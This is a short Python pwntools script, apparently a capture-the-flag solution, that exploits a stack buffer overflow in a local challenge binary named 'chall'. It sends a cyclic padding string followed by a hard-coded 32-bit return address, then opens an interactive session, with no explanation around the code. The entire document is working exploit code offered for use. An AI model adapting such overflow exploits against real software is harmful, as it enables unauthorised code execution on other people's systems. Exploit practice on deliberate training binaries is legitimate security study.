#! /usr/bin/python3

from pwn import *

HOST = ''
PORT = ''

p = process('./chall')

p.sendlineafter(b'Hola StackSmasher : ', b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaka\xd6\x91\x04\x08')

p.interactive()